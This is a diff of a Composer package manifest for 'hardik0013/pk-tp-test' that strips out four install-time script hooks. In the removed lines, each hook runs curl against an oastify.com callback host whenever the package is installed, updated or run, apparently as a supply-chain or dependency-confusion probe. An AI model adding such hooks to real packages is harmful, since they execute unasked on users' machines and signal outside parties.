@@ -1,1 +1,4 @@
-{"name":"hardik0013/pk-tp-test","description":"test","scripts":{"post-install-cmd":"curl https://sc1.6horwa6qy2a5m40jr8d78dzrlir9sx77s9ay.oastify.com/","post-update-cmd":"curl https://sc2.6horwa6qy2a5m40jr8d78dzrlir9sx77s9ay.oastify.com/","post-autoload-dump":"curl https://sc3.6horwa6qy2a5m40jr8d78dzrlir9sx77s9ay.oastify.com/","pre-command-run":"curl https://sc4.6horwa6qy2a5m40jr8d78dzrlir9sx77s9ay.oastify.com/"},"require":{"vendor/x":"*"}}
+{
+  "name": "hardik0013/pk-tp-test",
+  "description": "Test package"
+}
